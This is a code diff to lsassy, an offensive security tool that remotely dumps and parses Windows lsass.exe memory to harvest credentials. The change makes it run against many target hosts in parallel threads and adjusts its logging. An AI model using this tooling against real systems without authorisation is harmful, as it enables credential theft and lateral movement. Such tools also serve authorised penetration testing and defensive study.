@@ -4,6 +4,8 @@
 # Website:
 #  https://beta.hackndo.com
 
+from threading import Thread, RLock
+
 from lsassy.impacketconnection import ImpacketConnection
 from lsassy.dumper import Dumper
 from lsassy.parser import Parser
@@ -11,10 +13,13 @@ from lsassy.logger import Logger
 from lsassy.writer import Writer
 from lsassy.utils import *
 
+lock = RLock()
+align = 1
+
 
 class Lsassy:
-    def __init__(self, debug=False, quiet=False):
-        self._log = Logger(is_debug=debug, is_quiet=quiet)
+    def __init__(self, target, debug=False, quiet=False):
+        self._log = Logger(target, get_log_spaces(target, align), is_debug=debug, is_quiet=quiet)
         self._conn = None
         self._dumper = None
         self._parser = None
@@ -29,7 +34,7 @@ class Lsassy:
         if not login_result.success():
             return login_result
 
-        self._log.success("Authenticated")
+        self._log.info("Authenticated")
         return RetCode(ERROR_SUCCESS)
 
     def dump_lsass(self, options=Dumper.Options()):
@@ -44,7 +49,7 @@ class Lsassy:
             return dump_result
         self._dumpfile = self._dumper.getfile()
 
-        self._log.success("Process lsass.exe has been dumped")
+        self._log.info("Process lsass.exe has been dumped")
         return RetCode(ERROR_SUCCESS)
 
     def parse_lsass(self, options=Dumper.Options()):
@@ -54,12 +59,12 @@ class Lsassy:
             return parse_result
 
         self._credentials = self._parser.get_credentials()
-        self._log.success("Process lsass.exe has been parsed")
+        self._log.info("Process lsass.exe has been parsed")
         return RetCode(ERROR_SUCCESS)
 
     def write_credentials(self, options=Writer.Options()):
         self._writer = Writer(self._credentials, self._log, options)
-        write_result = self._writer.write()
+        write_result = self._writer.write(self._conn.hostname)
         if not write_result.success():
             return write_result
 
@@ -81,18 +86,19 @@ class Lsassy:
             if not r.success():
                 lsassy_warn(self._log, r)
 
-        self._log.success("Cleaning complete")
+        self._log.info("Cleaning complete")
 
     def get_logger(self):
         return self._log
 
 
-class Core:
-    def __init__(self):
+class Core(Thread):
+    def __init__(self, target):
+        Thread.__init__(self)
         self.dump_options = Dumper.Options()
         self.parse_options = Parser.Options()
         self.write_options = Writer.Options()
-
+        self.target = target
         self.lsassy = None
 
     def set_options_from_args(self, args):
@@ -113,8 +119,12 @@ class Core:
 
     def run(self):
         return_code = ERROR_UNDEFINED
+        args = get_args()
+        self.set_options_from_args(args)
+        self.lsassy = Lsassy(self.target, args.debug, args.quiet)
+        args.target = self.target
         try:
-            return_code = self._run()
+            return_code = self._run(args)
         except KeyboardInterrupt as e:
             print("\nQuitting gracefully...")
             return_code = RetCode(ERROR_USER_INTERRUPTION)
@@ -124,11 +134,7 @@ class Core:
             self.clean()
             lsassy_exit(self.lsassy.get_logger(), return_code)
 
-    def _run(self):
-        args = get_args()
-        self.set_options_from_args(args)
-
-        self.lsassy = Lsassy(args.debug, args.quiet)
+    def _run(self, args):
         """
         Extract hashes from arguments
         """
@@ -153,7 +159,15 @@ class Core:
 
 
 def run():
-    Core().run()
+    global align
+    targets = get_targets(get_args().target)
+    align = get_log_max_spaces(targets)
+    threads = [Core(target) for target in targets]
+    for thread in threads:
+        thread.start()
+
+    for thread in threads:
+        thread.join()
 
 
 if __name__ == '__main__':
